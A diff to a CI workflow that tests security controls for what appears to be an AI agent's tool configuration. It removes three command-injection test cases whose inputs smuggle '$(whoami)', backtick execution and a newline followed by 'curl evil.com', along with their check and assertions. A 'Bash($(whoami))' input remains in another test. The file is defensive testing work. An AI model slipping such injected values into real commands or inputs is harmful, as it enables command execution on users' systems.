@@ -94,15 +94,6 @@ jobs:
           - test-name: "Tools - Command Substitution"
             test-type: "tools-validation"
             malicious-input: "mcp__test,Bash($(whoami))"
-          - test-name: "Injection - Command Substitution"
-            test-type: "command-injection"
-            malicious-input: "Test $(whoami) injection"
-          - test-name: "Injection - Backtick Execution"
-            test-type: "command-injection"
-            malicious-input: "Test `whoami` injection"
-          - test-name: "Injection - Newline Escape"
-            test-type: "command-injection"
-            malicious-input: "Test\\ncurl evil.com"
           - test-name: "File Size - Exceeds Limit"
             test-type: "file-size"
             file-size-kb: 200
@@ -113,9 +104,6 @@ jobs:
       tools-dangerous-bash-status: ${{ steps.set-status.outputs.tools-dangerous-bash-command }}
       tools-shell-semicolon-status: ${{ steps.set-status.outputs.tools-shell-semicolon }}
       tools-command-sub-status: ${{ steps.set-status.outputs.tools-command-substitution }}
-      injection-command-sub-status: ${{ steps.set-status.outputs.injection-command-substitution }}
-      injection-backtick-status: ${{ steps.set-status.outputs.injection-backtick-execution }}
-      injection-newline-status: ${{ steps.set-status.outputs.injection-newline-escape }}
       file-size-status: ${{ steps.set-status.outputs.file-size-exceeds-limit }}
 
     steps:
@@ -173,23 +161,6 @@ jobs:
               fi
 
               echo "❌ FAIL: Dangerous tool not blocked: $ALLOWED_TOOLS"
-              exit 1
-              ;;
-
-            "command-injection")
-              TEST_INPUT="${{ matrix.malicious-input }}"
-
-              # Test printf safety - should treat input as literal string
-              OUTPUT=$(printf "TITLE: %s\n" "$TEST_INPUT")
-
-              # Check that dangerous patterns are NOT expanded
-              if [[ "$OUTPUT" == *'$('* ]] || [[ "$OUTPUT" == *'`'* ]]; then
-                echo "✅ PASS: Command substitution not executed"
-                echo "Output: $OUTPUT"
-                exit 0
-              fi
-
-              echo "❌ FAIL: Command injection may be possible"
               exit 1
               ;;
 
@@ -273,13 +244,6 @@ jobs:
           assert_test "Dangerous Bash Command" "${{ needs.validate-security-controls.outputs.tools-dangerous-bash-status }}" || ((failed_tests++))
           assert_test "Shell Semicolon" "${{ needs.validate-security-controls.outputs.tools-shell-semicolon-status }}" || ((failed_tests++))
           assert_test "Command Substitution in Tools" "${{ needs.validate-security-controls.outputs.tools-command-sub-status }}" || ((failed_tests++))
-          echo ""
-
-          # Command Injection Tests
-          echo "### Command Injection Protection"
-          assert_test "Command Substitution" "${{ needs.validate-security-controls.outputs.injection-command-sub-status }}" || ((failed_tests++))
-          assert_test "Backtick Execution" "${{ needs.validate-security-controls.outputs.injection-backtick-status }}" || ((failed_tests++))
-          assert_test "Newline Escape" "${{ needs.validate-security-controls.outputs.injection-newline-status }}" || ((failed_tests++))
           echo ""
 
           # File Size Tests
